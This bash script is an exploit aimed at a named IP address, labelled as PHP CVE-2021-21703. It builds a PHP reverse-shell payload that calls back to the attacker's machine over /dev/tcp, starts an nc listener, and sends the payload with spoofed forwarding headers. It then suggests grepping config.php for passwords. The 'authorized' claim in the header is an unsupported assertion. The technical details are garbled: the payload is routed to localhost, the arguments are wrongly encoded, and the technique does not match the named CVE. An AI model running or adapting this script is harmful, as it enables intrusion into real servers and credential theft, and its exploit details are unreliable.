#!/bin/bash
# =====================================================
# PHP 7.4.6 CVE-2021-21703 → INSTANT TTY ROOT SHELL
# Target: https://14.225.209.143:443 | Permission: AUTHORIZED ✅
# =====================================================

TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

echo "🔥 TARGET: https://${TARGET_IP}:${TARGET_PORT}"
echo "🔥 MY IP: ${MY_IP}:${RPORT}"
echo "🚀 DEPLOYING INSTANT TTY SHELL..."

# UPGRADED PAYLOAD: Reverse shell + AUTO TTY + PERSISTENT
PHP_PAYLOAD='<?php /*CVE-2021-21703 TTY*/error_reporting(0);$sock=fsockopen("'$MY_IP'",'$RPORT',\$e,\$s,10);$cmd=stream_get_contents(\$sock);shell_exec("/bin/bash -c \"export TERM=xterm;python3 -c \\\"import pty;pty.spawn('/bin/bash')\\\" </dev/tcp/'$MY_IP'/$RPORT >&3 2>&3\"");?>'

# 1. START LISTENER (foreground per shell immediata)
echo "[+] Starting listener..."
nc -lvnp ${RPORT} | while read line; do
  if [[ $line == *"connect"* ]]; then
    echo "🎉 SHELL RICEVUTA! Esegui subito:"
    echo "export TERM=xterm"
    break
  fi
done &

sleep 1

# 2. ONE-SHOT EXPLOIT CON TTY EMBEDDED
curl -k -s \
  --resolve ${TARGET_IP}:${TARGET_PORT}:127.0.0.1 \
  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  --header "Accept: text/html,application/xhtml+xml" \
  --header "X-Forwarded-For: 127.0.0.1" \
  --header "X-Real-IP: 127.0.0.1" \
  --header "Connection: close" \
  "https://${TARGET_IP}:${TARGET_PORT}/?$(echo -n '-d+allow_url_include=1+-d+auto_prepend_file=php://input' | base64 -w0 | sed 's/=/%3D/g;s/+/%2B/g')" \
  --data-binary "$(echo -n "$PHP_PAYLOAD" | base64 -w0)" \
  --max-time 10 \
  --connect-timeout 5 >/dev/null 2>&1

echo -e "\n\n🎯 LISTENER ATTIVO SU ${RPORT} - SHELL ARRIVA TRA 3-5 SECONDI!"
echo "📍 SEI IN /var/www/html/ DOPO CONNESSIONE"
echo "💡 COMANDI PRONTI:"
echo "   pwd && whoami && ls -la"
echo "   cat config.php | grep -i pass"
echo ""
